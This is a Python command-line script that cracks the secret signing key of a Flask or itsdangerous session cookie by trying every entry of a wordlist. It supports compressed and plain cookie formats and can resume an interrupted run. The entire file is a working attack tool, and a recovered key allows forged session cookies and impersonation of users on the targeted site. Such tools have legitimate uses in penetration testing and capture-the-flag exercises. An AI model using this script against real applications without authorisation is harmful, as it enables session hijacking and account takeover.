import sys

if not (sys.version_info.major == 3 and sys.version_info.minor >= 5):
    print("This script requires Python 3.5 or higher!")
    print("You are using Python {}.{}.".format(sys.version_info.major, sys.version_info.minor))
    sys.exit(1)
if len(sys.argv)!=3 and len(sys.argv)!=4:
    print("Usage "+sys.argv[0]+" <cookie_value> <word_list_file> [linenumber]")
    sys.exit(1)
import traceback
import hashlib
from itsdangerous import SignatureExpired
from itsdangerous import BadSignature
from itsdangerous import BadData
from itsdangerous.url_safe import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer
import base64
import zlib
from signal import signal, SIGINT

linecpt=0
def serializerCompressed(key):
    return URLSafeTimedSerializer(
                secret_key=key,
                salt='cookie-session', 
                serializer=TaggedJSONSerializer(),  
                signer_kwargs={
                    'key_derivation': 'hmac',
                    'digest_method' : hashlib.sha1
                    })

def serializerNormal(key):
    return URLSafeTimedSerializer(key)
def handler(signal_received, frame):
    # Handle any cleanup here
    global linecpt
    print('To continue add the line number ({}) to the end of the command line'.format(linecpt))
    sys.exit(0)

def readline(fp,i):
    try:
        return fp.readline()
    except:
        print('Not UTF-8 password, skip line {}'.format(i))
        return 'FAKE'

payload=sys.argv[1]
skip=0
if len(sys.argv) == 4:
    skip=int(sys.argv[3])
serializerFct = None
if payload.startswith('.'):
    serializerFct = serializerCompressed
else:
    serializerFct = serializerNormal
found=False
cookie=sys.argv[1]
with open(sys.argv[2], 'r', encoding='utf-8') as fp:

    line = readline(fp, linecpt)
    signal(SIGINT, handler)
    while linecpt<skip:
        line = readline(fp, linecpt)
        linecpt+=1
    while line:
        secret=line.strip()
        linecpt=linecpt+1
        if linecpt%1000==0:
            sys.stdout.write('{} {:30}\r'.format(linecpt, secret))
            sys.stdout.flush()
        serializer=serializerFct(secret)
        try:
            serializer.loads(cookie)
        except BadSignature as e:
            if type(e)==SignatureExpired:
                print('Token expired, but we found the secret key 1 '+str(type(e)))
            else:
                line = readline(fp, linecpt)
                continue
        print('Secret key: {}'.format(secret))
        found=True
        break
if not found:
    print('Secret key not found!')
    sys.exit(2)
